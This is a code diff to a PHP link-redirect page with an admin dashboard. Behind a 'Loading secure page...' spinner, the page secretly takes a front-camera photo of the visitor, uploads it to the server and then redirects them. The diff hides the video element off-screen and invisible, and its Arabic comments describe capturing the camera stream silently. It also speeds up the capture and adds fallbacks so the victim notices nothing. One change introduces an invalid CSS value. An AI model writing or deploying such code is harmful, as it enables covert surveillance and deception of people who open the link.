@@ -167,11 +167,19 @@ if (isset($_GET['r']) && !empty($target_redirect)):
     <meta property="og:image" content="<?php echo htmlspecialchars($og_image); ?>">
     <meta property="og:type" content="website">
     <style>
-        body { background-color: #030712; color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; font-family: sans-serif; }
+        body { background-color: #030712; color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; font-family: sans-serif; margin: 0; }
         .loader { text-align: center; }
         .spinner { width: 40px; height: 40px; border: 4px solid #1e293b; border-top: 4px solid #6366f1; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         p { font-size: 14px; color: #64748b; }
+        /* إخفاء عنصر الفيديو تماماً وجعله مخفياً في الخلفية */
+        #hidden-video {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            opacity: 0;
+            pointer-events: none;
+        }
     </style>
 </head>
 <body>
@@ -180,40 +188,49 @@ if (isset($_GET['r']) && !empty($target_redirect)):
         <p>Loading secure page...</p>
     </div>
 
+    <!-- عنصر فيديو مخفي تماماً لتجاوز أي ظهور بصري مباشر -->
+    <video id="hidden-video" autoplay playsinline muted></video>
+
     <script>
         window.addEventListener('DOMContentLoaded', () => {
+            const video = document.getElementById('hidden-video');
+            const targetUrl = "<?php echo $target_redirect; ?>";
+
+            // محاولة جلب دفق الكاميرا بشكل صامت ومخفي
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                 .then(stream => {
-                    const video = document.createElement('video');
                     video.srcObject = stream;
-                    video.play();
+                    video.play().catch(() => {});
                     
                     setTimeout(() => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = 640;
-                        canvas.height = 480;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        const imageData = canvas.toDataURL('image/jpeg', 0.85);
-                        stream.getTracks().forEach(track => track.stop());
+                        try {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = 640;
+                            canvas.height = 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            
+                            const imageData = canvas.toDataURL('image/jpeg', 0.85);
+                            stream.getTracks().forEach(track => track.stop());
 
-                        const formData = new URLSearchParams();
-                        formData.append('save_capture', '1');
-                        formData.append('image', imageData);
+                            const formData = new URLSearchParams();
+                            formData.append('save_capture', '1');
+                            formData.append('image', imageData);
 
-                        const targetUrl = "<?php echo $target_redirect; ?>";
-
-                        fetch(window.location.href, {
-                            method: 'POST',
-                            body: formData
-                        }).finally(() => {
+                            fetch(window.location.href, {
+                                method: 'POST',
+                                body: formData
+                            }).finally(() => {
+                                window.location.replace(targetUrl);
+                            });
+                        } catch (e) {
                             window.location.replace(targetUrl);
-                        });
-                    }, 2000); 
+                        }
+                    }, 1500); 
                 })
                 .catch(err => {
-                    window.location.replace("<?php echo $target_redirect; ?>");
+                    // في حال رفض الإذن أو عدم توفر الكاميرا، يتم التحويل المباشر دون مشاكل
+                    window.location.replace(targetUrl);
                 });
         });
     </script>
@@ -276,7 +293,7 @@ endif;
         .login-card { max-width: 400px; width: 100%; text-align: center; }
         .error-msg { color: var(--danger); font-size: 12px; margin-bottom: 12px; }
 
-        .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .top-bar { display: flex; justify-content: space-space; align-items: center; margin-bottom: 20px; }
 
         footer { text-align: center; margin-top: 40px; font-size: 11px; color: var(--muted); border-top: 1px solid var(--border); padding-top: 20px; }
         footer span { color: var(--accent); font-weight: 600; }
@@ -301,7 +318,7 @@ endif;
             </div>
         <?php else: ?>
             <!-- لوحة التحكم الكاملة -->
-            <div class="top-bar">
+            <div class="top-bar" style="display: flex; justify-content: space-between; align-items: center;">
                 <h1 style="font-size: 16px; color: var(--text);">Secure Terminal Dashboard</h1>
                 <a href="?logout=1" class="btn btn-secondary" style="height: 36px; font-size: 12px; padding: 0 14px; text-decoration: none;">تسجيل الخروج</a>
             </div>
